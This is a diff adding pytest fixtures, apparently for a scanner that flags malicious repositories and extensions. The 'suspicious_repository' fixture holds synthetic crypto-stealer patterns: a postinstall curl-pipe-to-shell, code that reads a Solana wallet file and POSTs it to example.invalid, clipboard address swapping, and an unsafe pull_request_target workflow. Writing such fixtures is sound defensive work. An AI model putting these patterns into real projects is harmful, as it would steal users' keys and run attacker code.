@@ -80,3 +80,93 @@ def suspicious_vsix(tmp_path: Path) -> Path:
     )
     return path
 
+
+@pytest.fixture
+def benign_repository(tmp_path: Path) -> Path:
+    path = tmp_path / "benign-repository.zip"
+    package = json.dumps(
+        {
+            "name": "benign-repository",
+            "version": "1.0.0",
+            "description": "Synthetic benign repository fixture.",
+            "scripts": {"test": "vitest --run"},
+            "dependencies": {"kleur": "4.1.5"},
+        }
+    )
+    pinned_sha = "a" * 40
+    path.write_bytes(
+        build_vsix(
+            {
+                "benign-repository/package.json": package,
+                "benign-repository/package-lock.json": json.dumps({"lockfileVersion": 3}),
+                "benign-repository/src/index.js": "export const greet = (name) => `hello ${name}`;\n",
+                "benign-repository/.github/workflows/test.yml": (
+                    "name: test\non: [push]\njobs:\n  test:\n    runs-on: ubuntu-latest\n"
+                    f"    steps:\n      - uses: actions/checkout@{pinned_sha}\n"
+                ),
+            }
+        )
+    )
+    return path
+
+
+@pytest.fixture
+def suspicious_repository(tmp_path: Path) -> Path:
+    path = tmp_path / "suspicious-repository.zip"
+    package = json.dumps(
+        {
+            "name": "synthetic-crypto-stealer-patterns",
+            "version": "0.0.0",
+            "description": "Defensive synthetic patterns; never execute.",
+            "scripts": {
+                "postinstall": "curl https://example.invalid/install.sh | sh",
+                "test": "node scripts/bootstrap.js",
+            },
+        },
+        indent=2,
+    )
+    source = """// Defensive fixture only. No real secrets or live destination.
+const fs = require('fs');
+const cp = require('child_process');
+async function inspect() {
+  const wallet = fs.readFileSync(process.env.HOME + '/.config/solana/id.json');
+  await fetch('https://example.invalid/collect', {method: 'POST', body: wallet});
+  const current = await navigator.clipboard.readText();
+  if (/^0x/.test(current)) await navigator.clipboard.writeText('0x1111111111111111111111111111111111111111');
+  cp.exec('echo synthetic-only');
+}
+exports.inspect = inspect;
+"""
+    workflow = """name: unsafe synthetic example
+on: pull_request_target
+jobs:
+  test:
+    permissions: write-all
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}
+      - run: npm test
+"""
+    path.write_bytes(
+        build_vsix(
+            {
+                "repo/package.json": package,
+                "repo/package-lock.json": json.dumps({"lockfileVersion": 3}),
+                "repo/scripts/bootstrap.js": source,
+                "repo/config/example.js": (
+                    "const mnemonic = 'synthetic alpha beta gamma delta epsilon zeta eta theta iota kappa lambda';\n"
+                ),
+                "repo/.github/workflows/unsafe.yml": workflow,
+                "repo/.vscode/tasks.json": json.dumps(
+                    {"version": "2.0.0", "tasks": [{"type": "shell", "command": "npm test"}]}
+                ),
+                "repo/.devcontainer/devcontainer.json": json.dumps(
+                    {"name": "demo", "postCreateCommand": "npm install"}
+                ),
+            }
+        )
+    )
+    return path
+
